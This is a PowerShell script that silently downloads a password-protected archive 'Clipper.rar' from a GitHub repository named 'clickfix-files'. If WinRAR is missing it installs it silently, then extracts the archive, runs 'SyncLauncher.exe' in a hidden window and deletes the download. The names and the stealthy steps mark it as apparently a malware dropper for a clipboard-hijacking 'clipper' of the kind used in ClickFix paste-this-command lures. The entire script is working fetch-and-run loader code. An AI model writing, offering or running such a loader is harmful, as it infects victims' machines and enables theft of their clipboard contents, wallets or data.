$ErrorActionPreference = "SilentlyContinue"

# Paths
$rarUrl = "https://github.com/0xL10NZ/clickfix-files/raw/refs/heads/main/Clipper.rar"
$downloadPath = "$env:USERPROFILE\AppData\Local\Temp\Clipper.rar"
$extractPath = "$env:USERPROFILE\AppData\Local\Temp\Clipper"
$exePath = "$extractPath\SyncLauncher.exe"

# Download Clipper.rar silently
$client = New-Object System.Net.WebClient
$client.DownloadFile($rarUrl, $downloadPath)

# Check if WinRAR is installed
$winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"
if (-not (Test-Path $winrarPath)) {
    $winrarInstallerUrl = "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe"
    $winrarInstallerPath = "$env:USERPROFILE\AppData\Local\Temp\winrar.exe"
    $client.DownloadFile($winrarInstallerUrl, $winrarInstallerPath)
    Start-Process -FilePath $winrarInstallerPath -ArgumentList "/S" -Wait -NoNewWindow -WindowStyle Hidden
    Remove-Item $winrarInstallerPath -Force
}

# Extract Clipper.rar silently
if (Test-Path $extractPath) {
    Remove-Item -Recurse -Force $extractPath
}
New-Item -ItemType Directory -Path $extractPath | Out-Null
Start-Process -FilePath $winrarPath -ArgumentList "x -p12345 -inul $downloadPath * $extractPath\" -Wait -NoNewWindow -WindowStyle Hidden

# Run SyncLauncher.exe silently
Start-Process -FilePath $exePath -NoNewWindow -WindowStyle Hidden

# Clean up
Remove-Item $downloadPath -Force
